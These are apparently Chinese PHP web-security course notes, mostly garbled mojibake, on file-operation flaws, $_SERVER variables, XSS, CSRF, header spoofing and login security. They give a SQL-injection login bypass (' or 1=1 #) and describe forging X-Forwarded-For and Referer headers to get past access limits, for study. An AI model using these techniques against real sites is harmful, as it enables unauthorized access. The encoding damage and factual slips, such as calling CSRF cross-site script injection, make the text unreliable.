<p>3ã€æ–‡ä»¶å†…å®¹&amp;è¯»å–&amp;å†™å…¥<br>4ã€ç¬¬ä¸‰æ–¹ç¼–è¾‘å™¨å¼•ç”¨å®ä¾‹</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼šå°è¿ªåšå®¢-æ–‡ä»¶æ“ä½œ-ä¸Šä¼ -ä¸‹è½½-åˆ é™¤-è¯»å–-å†™å…¥ç­‰"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼šå°è¿ªåšå®¢-æ–‡ä»¶æ“ä½œ-ä¸Šä¼ -ä¸‹è½½-åˆ é™¤-è¯»å–-å†™å…¥ç­‰" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼šå°è¿ªåšå®¢-æ–‡ä»¶æ“ä½œ&amp;ä¸Šä¼ &amp;ä¸‹è½½&amp;åˆ é™¤&amp;è¯»å–&amp;å†™å…¥ç­‰"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼šå°è¿ªåšå®¢-æ–‡ä»¶æ“ä½œ&amp;ä¸Šä¼ &amp;ä¸‹è½½&amp;åˆ é™¤&amp;è¯»å–&amp;å†™å…¥ç­‰</h4><p>#æ–‡ä»¶ä¸Šä¼ ç±»ï¼š-ä»»æ„æ–‡ä»¶ä¸Šä¼ <br>1ã€ä»£ç è‡ªä¸»å†™<br>2ã€å¤–éƒ¨ç¼–è¾‘å™¨æºç å¼•ç”¨<br>3ã€å¼€å‘æ¡†æ¶å¼•ç”¨</p>
<p>#æ–‡ä»¶ä¸‹è½½ç±»ï¼š-ä»»æ„æ–‡ä»¶ä¸‹è½½<br>1ã€ç›´è¿URLè®¿é—®<br>2ã€ä¼ å‚å¤´éƒ¨ä¿®æ”¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç›´è¿ä¸‹è½½ä¼šæš´éœ²æ–‡ä»¶å­˜å‚¨è·¯å¾„ï¼Œå¦‚æœæœåŠ¡å™¨ç«¯çš„æ–‡ä»¶å­˜å‚¨è·¯å¾„åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå»ºè®®ä½¿ç”¨ PHP å†…ç½®çš„ readfile()å‡½æ•°æ¥ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œä»¥é¿å…æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚åŒæ—¶ï¼Œå¯ä»¥è®¾ç½®å“åº”å¤´ä¿¡æ¯ä¸­çš„ Content-Disposition å±æ€§ä¸ºinlineï¼Œä½¿æµè§ˆå™¨å°†æ–‡ä»¶ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œè€Œä¸æ˜¯ä¸‹è½½åˆ°æœ¬åœ°ã€‚</span><br><span class="line">ä¼ å‚ä¸‹è½½å¯èƒ½å­˜åœ¨å‚æ•°æ³¨å…¥æ”»å‡»çš„é£é™©ï¼Œå› æ­¤åœ¨æ¥æ”¶å’Œå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„å‚æ•°æ—¶ï¼Œåº”è¯¥å¯¹è¾“å…¥å€¼è¿›è¡Œè¿‡æ»¤å’ŒéªŒè¯ï¼Œé¿å…æ¶æ„ç”¨æˆ·åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦æˆ–è„šæœ¬ä»£ç ç­‰æ‰‹æ®µæ„é€ æ”»å‡»è¯·æ±‚ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨</span><br><span class="line">PHP å†…ç½®çš„ filter_input() å‡½æ•°æ¥å¯¹å‚æ•°å€¼è¿›è¡Œè¿‡æ»¤ï¼Œæˆ–ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…åˆæ³•çš„å‚æ•°æ ¼å¼ã€‚</span><br><span class="line">åœ¨ä¸‹è½½æ–‡ä»¶ä¹‹å‰ï¼Œåº”è¯¥å¯¹ç”¨æˆ·èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œç¡®ä¿åªæœ‰å…·å¤‡ç›¸åº”æƒé™çš„ç”¨æˆ·æ‰èƒ½è®¿é—®å’Œä¸‹è½½æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œåœ¨ä½¿ç”¨ä¼ å‚ä¸‹è½½æ—¶ï¼Œå¯ä»¥æ£€æŸ¥ç”¨æˆ·çš„ç™»å½•çŠ¶æ€å’Œè§’è‰²æƒé™ï¼Œé¿å…æœªç»æˆæƒçš„ä¸‹è½½æ“ä½œã€‚</span><br><span class="line">å¯¹äºéœ€è¦ä¸‹è½½çš„æ–‡ä»¶ï¼Œå»ºè®®å¯¹å…¶ç±»å‹ã€å¤§å°ã€æ¥æºå’Œå®‰å…¨æ€§ç­‰è¿›è¡Œæ£€æŸ¥å’Œé™åˆ¶ï¼Œé¿å…ä¸‹è½½æ¶æ„è½¯ä»¶ã€ç—…æ¯’æˆ–å¤§å‹æ–‡ä»¶ç­‰å¯¹æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯å¸¦æ¥çš„è´Ÿæ‹…å’Œå®‰å…¨å¨èƒã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨</span><br><span class="line">PHP å†…ç½®çš„ mime_content_type() å‡½æ•°æ£€æŸ¥æ–‡ä»¶ MIME ç±»å‹ï¼Œæˆ–ä½¿ç”¨ filesize() å‡½æ•°æ£€æŸ¥æ–‡ä»¶å¤§å°ï¼Œå¹¶åœ¨å‰ç«¯æ·»åŠ æ–‡ä»¶å¤§å°é™åˆ¶ã€‚å¯¹äºä¸Šä¼ åˆ°æœåŠ¡å™¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é˜²ç—…æ¯’è½¯ä»¶å’Œé˜²ç«å¢™ç­‰å·¥å…·å¯¹æ–‡ä»¶è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ã€‚</span><br><span class="line">//http://www.xiaodi.com/soft/è½¯ä»¶.zip</span><br><span class="line">//http://www.xiaodi.com/soft/down.php?filename=.zip</span><br></pre></td></tr></table></figure>

<p>#æ–‡ä»¶åˆ é™¤ç±»-ä»»æ„æ–‡ä»¶åˆ é™¤1ã€æ–‡ä»¶åˆ é™¤<br>2ã€æ–‡ä»¶å¤¹åˆ é™¤<br>åˆ é™¤æ–‡ä»¶ä½¿ç”¨unlink()å‡½æ•°ï¼Œåˆ é™¤æ–‡ä»¶å¤¹ä½¿ç”¨rmdir()å‡½æ•°ã€‚</p>
<p>#æ–‡ä»¶å†…å®¹æ“ä½œç±»-ä»»æ„æ–‡ä»¶è¯»å–&amp;å†™å…¥<br>1ã€æ–‡ä»¶è¯»å–<br>2ã€æ–‡ä»¶å†™å…¥</p>
<p>æ–‡ä»¶åŒ…å«æ¼æ´<br>1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«<br>2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«<br>webæ¼æ´æ ¸å¿ƒ<br>1ã€å¯æ§å˜é‡<br>2ã€ç‰¹å®šå‡½æ•°</p>
<h1 id="ç¬¬14å¤©-PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®8è¾“å…¥è¾“å‡ºç±»-ç•™è¨€æ¿8è®¿é—®IP-UAå¤´æ¥æº"><a href="#ç¬¬14å¤©-PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®8è¾“å…¥è¾“å‡ºç±»-ç•™è¨€æ¿8è®¿é—®IP-UAå¤´æ¥æº" class="headerlink" title="ç¬¬14å¤© PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®8è¾“å…¥è¾“å‡ºç±»&amp;ç•™è¨€æ¿8è®¿é—®IP&amp;UAå¤´æ¥æº"></a>ç¬¬14å¤© PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®8è¾“å…¥è¾“å‡ºç±»&amp;ç•™è¨€æ¿8è®¿é—®IP&amp;UAå¤´æ¥æº</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-1"><a href="#çŸ¥è¯†ç‚¹ï¼š-1" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><h5 id="1ã€PHP-å…¨å±€å˜é‡-SERVER"><a href="#1ã€PHP-å…¨å±€å˜é‡-SERVER" class="headerlink" title="1ã€PHP-å…¨å±€å˜é‡_SERVER"></a>1ã€PHP-å…¨å±€å˜é‡_SERVER</h5><p>åˆ©ç”¨å…¨å±€å˜é‡å¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨å’Œæ‰§è¡Œç¯å¢ƒä¿¡æ¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä¸€äº›PHPä¸­çš„å…¨å±€å˜é‡</span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_PORT&#x27;] //ç«¯å£ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_ADDR&#x27;] //å½“å‰ç”¨æˆ· IP</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_HOST&#x27;] //å½“å‰ç”¨æˆ·ä¸»æœºå </span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_NAME&#x27;] //æœåŠ¡å™¨ä¸»æœºçš„åç§°ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PHP_SELF&#x27;]//æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;argv&#x27;] //ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;argc&#x27;] //ä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;GATEWAY_INTERFACE&#x27;]//CGI è§„èŒƒçš„ç‰ˆæœ¬ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_SOFTWARE&#x27;] //æœåŠ¡å™¨æ ‡è¯†çš„å­—ä¸²</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_PROTOCOL&#x27;] //è¯·æ±‚é¡µé¢æ—¶é€šä¿¡åè®®çš„åç§°å’Œç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REQUEST_METHOD&#x27;]//è®¿é—®é¡µé¢æ—¶çš„è¯·æ±‚æ–¹æ³•</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REQUEST_URI&#x27;] //URLè·¯å¾„</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;QUERY_STRING&#x27;] //æŸ¥è¯¢(query)çš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;DOCUMENT_ROOT&#x27;] //å½“å‰è¿è¡Œè„šæœ¬æ‰€åœ¨çš„æ–‡æ¡£æ ¹ç›®å½•</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT&#x27;] //å½“å‰è¯·æ±‚çš„ Accept: å¤´éƒ¨çš„å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_CHARSET&#x27;] //å½“å‰è¯·æ±‚çš„ Accept-Charset: å¤´éƒ¨çš„å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;] //å½“å‰è¯·æ±‚çš„ Accept-Encoding: å¤´éƒ¨çš„å†…å®¹</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;];//æµè§ˆå™¨è¯­è¨€</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_CONNECTION&#x27;] //å½“å‰è¯·æ±‚çš„ Connection: å¤´éƒ¨çš„å†…å®¹ã€‚ä¾‹å¦‚ï¼šâ€œKeep-Aliveâ€ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_HOST&#x27;] //è·å–å½“å‰ç¨‹åºæ‰€åœ¨ä¸»æœº,å½“å‰è¯·æ±‚çš„ Host: å¤´éƒ¨çš„å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_REFERER&#x27;] //é“¾æ¥åˆ°å½“å‰é¡µé¢çš„å‰ä¸€é¡µé¢çš„ URL åœ°å€ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_USER_AGENT&#x27;] //å½“å‰è¯·æ±‚çš„ User_Agent: å¤´éƒ¨çš„å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTPS&#x27;]//å¦‚æœé€šè¿‡httpsè®¿é—®,åˆ™è¢«è®¾ä¸ºä¸€ä¸ªéç©ºçš„å€¼(on)ï¼Œå¦åˆ™è¿”å›off</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SCRIPT_FILENAME&#x27;] #å½“å‰æ‰§è¡Œè„šæœ¬çš„ç»å¯¹è·¯å¾„åã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_ADMIN&#x27;] #ç®¡ç†å‘˜ä¿¡æ¯</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_PORT&#x27;] #æœåŠ¡å™¨æ‰€ä½¿ç”¨çš„ç«¯å£</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_SIGNATURE&#x27;] #åŒ…å«æœåŠ¡å™¨ç‰ˆæœ¬å’Œè™šæ‹Ÿä¸»æœºåçš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PATH_TRANSLATED&#x27;] #å½“å‰è„šæœ¬æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿï¼ˆä¸æ˜¯æ–‡æ¡£æ ¹ç›®å½•ï¼‰çš„åŸºæœ¬è·¯å¾„ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SCRIPT_NAME&#x27;] #åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„ã€‚è¿™åœ¨é¡µé¢éœ€è¦æŒ‡å‘è‡ªå·±æ—¶éå¸¸æœ‰ç”¨ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PHP_AUTH_USER&#x27;] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PHP_AUTH_PW&#x27;] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯ç”¨æˆ·è¾“å…¥çš„å¯†ç ã€‚</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;AUTH_TYPE&#x27;] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯è®¤è¯çš„ç±»å‹</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚è·å–å¹¶è¿”å›è®¿é—®è€…UAå¤´ä¿¡æ¯ï¼Œè‹¥æ­¤æ—¶åŠŸèƒ½ç‚¹æœ‰è·å–å¹¶å±•ç¤ºUAçš„åŠŸèƒ½ï¼Œå¯ä»¥å°è¯•è¿›è¡ŒæŠ“åŒ…ä¿®æ”¹uaå¤´ä¸ºjsä»£ç ï¼Œæ­¤æ—¶å°±é€ æˆäº†xssæ³¨å…¥ã€‚</p>
<p>(ä»»ä½•å°†ä½ æ‰€è¾“å…¥çš„å±•ç¤ºåœ¨é¡µé¢ä¸­çš„ï¼Œéƒ½å¯èƒ½ä¼šå­˜åœ¨xssçš„ç›¸å…³æ¼æ´)ã€</p>
<h5 id="2ã€MYSQL-æ’å…¥è¯­æ³•INSERT"><a href="#2ã€MYSQL-æ’å…¥è¯­æ³•INSERT" class="headerlink" title="2ã€MYSQL-æ’å…¥è¯­æ³•INSERT"></a>2ã€MYSQL-æ’å…¥è¯­æ³•INSERT</h5><h5 id="3ã€è¾“å…¥è¾“å‡º-XSS-åå°„-å­˜å‚¨"><a href="#3ã€è¾“å…¥è¾“å‡º-XSS-åå°„-å­˜å‚¨" class="headerlink" title="3ã€è¾“å…¥è¾“å‡º-XSS&amp;åå°„&amp;å­˜å‚¨"></a>3ã€è¾“å…¥è¾“å‡º-XSS&amp;åå°„&amp;å­˜å‚¨</h5><p>è¾“å…¥æ¡†è¾“å…¥jsè¯­å¥ï¼ˆä¾‹å¦‚ï¼š)ä¼šå¯¼è‡´æµè§ˆå™¨åœ¨æ˜¾ç¤ºæ—¶ä¼šå°†è¯­å¥æ‰§è¡Œï¼Œä»è€Œå¼¹çª—çš„æ“ä½œï¼ˆXSSåå°„ï¼‰<br>ç•™è¨€æ¿è¾“å…¥jsè¯­å¥åï¼Œå› ä¸ºç•™è¨€æ¿çš„åŠŸèƒ½ä¼šå°†è¯­å¥ä¿å­˜å¹¶å±•ç¤ºï¼Œå°±é€ æˆäº†è¯­å¥å­˜å‚¨åœ¨äº†æ•°æ®åº“ä¸­å°±å¯¼è‡´äº†xsså­˜å‚¨å‹æ³¨å…¥ï¼Œåˆ©ç”¨å­˜å‚¨å‹æ³¨å…¥å¯ä»¥è·å–ç”¨æˆ·cookieã€‚</p>
<h5 id="4ã€å®‰å…¨é—®é¢˜-XSSè·¨ç«™-CSRFç­‰"><a href="#4ã€å®‰å…¨é—®é¢˜-XSSè·¨ç«™-CSRFç­‰" class="headerlink" title="4ã€å®‰å…¨é—®é¢˜-XSSè·¨ç«™&amp;CSRFç­‰"></a>4ã€å®‰å…¨é—®é¢˜-XSSè·¨ç«™&amp;CSRFç­‰</h5><p>å…¨å±€å˜é‡$_SERVERä¸­æœ‰&#x2F;&#x2F; $_SERVER[â€˜HTTP_REFERERâ€™] &#x2F;&#x2F;é“¾æ¥åˆ°å½“å‰é¡µé¢çš„å‰ä¸€é¡µé¢çš„ URL åœ°å€ã€‚ä½¿ç”¨è¿™ä¸€å˜é‡å¯ä»¥è·å–è®¿é—®è¯¥é“¾æ¥å‰çš„ä¸Šä¸€ä¸ªé“¾æ¥åœ°å€ï¼Œåœ¨é¢„é˜²CSRFï¼ˆè·¨ç«™è„šæœ¬æ³¨å…¥ï¼‰ä¸­å¯ä»¥èµ·åˆ°éªŒè¯è·³è½¬åœ°å€æ˜¯å¦ä¸ºæ¶æ„åœ°å€ï¼Œèµ·åˆ°é˜²èŒƒä½œç”¨ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CSRF:</span><br><span class="line">è¦æˆåŠŸå®æ–½ CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡»ï¼Œé€šå¸¸éœ€è¦æ»¡è¶³ä¸€å®šçš„å‰ææ¡ä»¶ï¼ŒåŒ…æ‹¬ï¼š</span><br><span class="line">1ã€ ç›®æ ‡ç½‘ç«™å­˜åœ¨æ¼æ´ï¼šCSRF æ”»å‡»çš„åŸºæœ¬åŸç†æ˜¯åˆ©ç”¨ç”¨æˆ·åœ¨è®¿é—®ç›®æ ‡ç½‘ç«™æ—¶å·²ç»ç™»å½•è¿‡çš„è®¤è¯ä¿¡æ¯ï¼Œå› æ­¤ç›®æ ‡ç½‘ç«™å¿…é¡»å­˜åœ¨ç›¸åº”çš„æ¼æ´æ‰èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚ä¾‹å¦‚ï¼Œç›®æ ‡ç½‘ç«™æ²¡æœ‰è¿›è¡Œæœ‰æ•ˆçš„èº«ä»½éªŒè¯æˆ–ä»¤ç‰Œæ ¡éªŒï¼Œå…è®¸ä»å¤–éƒ¨å‘é€è¯·æ±‚ç­‰ã€‚</span><br><span class="line">2ã€ç”¨æˆ·å·²ç»ç™»å½•ç›®æ ‡ç½‘ç«™ï¼šç”±äº CSRFæ”»å‡»éœ€è¦åˆ©ç”¨ç”¨æˆ·å·²ç»ç™»å½•è¿‡çš„è®¤è¯ä¿¡æ¯ï¼Œå› æ­¤æ”»å‡»è€…å¿…é¡»ç¡®ä¿å—å®³ç”¨æˆ·åœ¨æ”»å‡»å‘èµ·æ—¶å·²ç»ç™»å½•äº†ç›®æ ‡ç½‘ç«™ï¼Œå¹¶ä¸”æµè§ˆå™¨ä¿å­˜äº†ç›¸å…³çš„ Cookie æˆ–Session ä¿¡æ¯ã€‚</span><br><span class="line">3ã€æ”»å‡»è€…èƒ½å¤Ÿæ„é€ æ¶æ„è¯·æ±‚ï¼šä¸ºäº†å®æ–½ CSRFæ”»å‡»ï¼Œæ”»å‡»è€…éœ€è¦èƒ½å¤Ÿæ„é€ å‡ºç›®æ ‡ç½‘ç«™æ‰€æ¥å—çš„åˆæ³•è¯·æ±‚æ ¼å¼ï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ç½‘ç«™ã€‚</span><br><span class="line"></span><br><span class="line">è¦å’Œå¦ä¸€ä¸ªåè¾¹ä¼šæ¶‰åŠåˆ°çš„CSOPè¿›è¡ŒåŒºåˆ†</span><br></pre></td></tr></table></figure>

<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><h5 id="å°è¿ªåšå®¢è¾“å…¥è¾“å‡º-ç•™è¨€æ¿-è®¿é—®è·å–"><a href="#å°è¿ªåšå®¢è¾“å…¥è¾“å‡º-ç•™è¨€æ¿-è®¿é—®è·å–" class="headerlink" title="å°è¿ªåšå®¢è¾“å…¥è¾“å‡º&amp;ç•™è¨€æ¿&amp;è®¿é—®è·å–"></a>å°è¿ªåšå®¢è¾“å…¥è¾“å‡º&amp;ç•™è¨€æ¿&amp;è®¿é—®è·å–</h5><p>é€šè¿‡è¾“å…¥è¾“å‡ºã€ç•™è¨€æ¿å®ç°xssåå°„å‹å’Œå­˜å‚¨å‹æ³¨å…¥</p>
<h5 id="å¢¨è€…é¶åœº-IPåœ°å€ä¼ªé€ æ¥æº-æ¥æºé¡µä¼ªé€ "><a href="#å¢¨è€…é¶åœº-IPåœ°å€ä¼ªé€ æ¥æº-æ¥æºé¡µä¼ªé€ " class="headerlink" title="å¢¨è€…é¶åœº-IPåœ°å€ä¼ªé€ æ¥æº&amp;æ¥æºé¡µä¼ªé€ "></a>å¢¨è€…é¶åœº-IPåœ°å€ä¼ªé€ æ¥æº&amp;æ¥æºé¡µä¼ªé€ </h5><p>é€šè¿‡burpæŠ“åŒ…ä¿®æ”¹referå­—æ®µç»•è¿‡ç½‘é¡µçš„è®¿é—®é™åˆ¶ï¼ˆæ¥æºé¡µä¼ªé€ ï¼‰<br>ç½‘ç«™å­˜åœ¨IPåœ°å€é™åˆ¶è®¿é—®ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹æ¥æºIPå®ç°ç»•è¿‡</p>
<p>åªæœ‰å½“ä»£ç ä¸­è·å–IPä¸º$_SERVER[â€œHTTP_X_FORWORDED_FORâ€]æ—¶æ‰å¯é€šè¿‡æŠ“åŒ…æ”¹åŒ…å®ç°ç»•è¿‡ï¼Œå…¶ä»–çš„è·å–ipçš„æ–¹æ³•å¯èƒ½æ— æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‹“å±•ï¼š</span><br><span class="line">ctfä¸­å¸¸è€ƒçš„httpç›¸å…³å†…å®¹</span><br><span class="line">ä»æœ¬åœ°è®¿é—®ï¼š  ä¿®æ”¹httpæŠ¥æ–‡ä¸­çš„XFFï¼ŒX-Real-IPï¼ŒClient-IP</span><br><span class="line">ä»å“ªé‡Œæ¥ï¼š Reference</span><br><span class="line">è¦ç”¨ä»€ä¹ˆæµè§ˆå™¨ï¼šUser-Agent</span><br><span class="line">ä»£ç†ï¼š via</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬15å¤©-PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®-ç™»å½•éªŒè¯-Cookie-Session-éªŒè¯ç å®‰å…¨"><a href="#ç¬¬15å¤©-PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®-ç™»å½•éªŒè¯-Cookie-Session-éªŒè¯ç å®‰å…¨" class="headerlink" title="ç¬¬15å¤© PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®&amp;ç™»å½•éªŒè¯&amp;Cookie&amp;Session&amp;éªŒè¯ç å®‰å…¨"></a>ç¬¬15å¤© PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®&amp;ç™»å½•éªŒè¯&amp;Cookie&amp;Session&amp;éªŒè¯ç å®‰å…¨</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-2"><a href="#çŸ¥è¯†ç‚¹ï¼š-2" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€åå°éªŒè¯-ç™»å½•ç”¨æˆ·é€»è¾‘å®‰å…¨<br>2ã€åå°éªŒè¯-COOKIE&amp;SESSION<br>3ã€åå°éªŒè¯-éªŒè¯ç &amp;ä¸‡èƒ½å¯†ç ç­‰<br>ä¸‡èƒ½å¯†ç ï¼šåˆ¤æ–­æ˜¯å¦ç™»å½•æˆåŠŸæ˜¯çœ‹å°†æäº¤çš„ç”¨æˆ·å¯†ç å¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢åæ˜¯å¦è¿”å›æ•°æ®æˆ–è¿”å›è¡Œæ•°æ˜¯å¦å¯¹åº”ã€‚<br>å› ä¸ºå‡ºå·¡è¿‡ç¨‹ä¸­æ˜¯å°†å‚æ•°å¸¦å…¥åˆ°æ•°æ®åº“æŸ¥è¯¢ï¼Œselect * from data where username&#x3D;â€˜adminâ€™ and pass&#x3D;â€˜passâ€™<br>æ­¤æ—¶æ„é€ ç”¨æˆ·åä¸º â€™ or 1&#x3D;1 # å¸¦å…¥åˆ°æ•°æ®åº“ä¸­æŸ¥è¯¢å°±ä¸º select * from data where username&#x3D;â€™ â€™ or 1&#x3D;1 # and pass&#x3D;â€˜passâ€™<br>æ­¤æ—¶å‡ æˆ– çœŸ ä¸ºçœŸ åé¢çš„è¯­å¥é€šè¿‡#æ³¨é‡Šï¼Œå³å¯ç»•è¿‡ç™»å½•åˆ¤å®š<br>éªŒè¯ç å®‰å…¨ï¼šéªŒè¯ç ä¸å¤±æ•ˆï¼Œå¯é€šè¿‡burpæŠ“åŒ…å†ä¸ä¿®æ”¹éªŒè¯ç çš„æƒ…å†µä¸‹è¿›è¡Œå¯†ç æ›¿æ¢ã€‚</p>
<h4 id="ç™»å½•éªŒè¯çš„æµç¨‹ï¼š"><a href="#ç™»å½•éªŒè¯çš„æµç¨‹ï¼š" class="headerlink" title="ç™»å½•éªŒè¯çš„æµç¨‹ï¼š"></a>ç™»å½•éªŒè¯çš„æµç¨‹ï¼š</h4><p>1ã€å‘é€ç™»å½•è¯·æ±‚å¸å·å¯†ç <br>2ã€æ¥å—å¸å·å¯†ç <br>3ã€åˆ¤æ–­å¸å·å¯†ç çš„å‡†ç¡®æ€§<br>æ­£ç¡®æˆåŠŸç™»å½•-&gt;è·³è½¬æˆåŠŸé¡µé¢<br>é”™è¯¯å¤±è´¥ç™»å½•-&gt;é‡æ–°ç™»å½•<br>HTTPæ˜¯æ— çŠ¶æ€çš„åè®®ï¼Œæ‰€ä»¥ä¸ºäº†è®°å½•èº«ä»½çŠ¶æ€ä¿¡æ¯ä¼šä½¿ç”¨cookieå’Œsessionæ¥å­˜å‚¨ã€‚<br>åå°ç®¡ç†ç³»ç»Ÿæœ‰å¤šä¸ªæ–‡ä»¶é¡µé¢ï¼Œä¸ºäº†æ–¹ä¾¿éªŒè¯ï¼Œä¸€èˆ¬ä¼šé€‰ç”¨cookieæˆ–sessionè¿›è¡ŒéªŒè¯<br>cookieï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°å®¢æˆ·ç«¯æµè§ˆå™¨å†…<br>cookieå®‰å…¨ï¼šcookieä¿®æ”¹ ä¼ªé€  ç›—å–<br>session:èº«ä»½éªŒè¯å­˜å‚¨åˆ°æœåŠ¡ç«¯æœåŠ¡å™¨å†…<br>sessionå®‰å…¨ï¼šåŠ«æŒ</p>
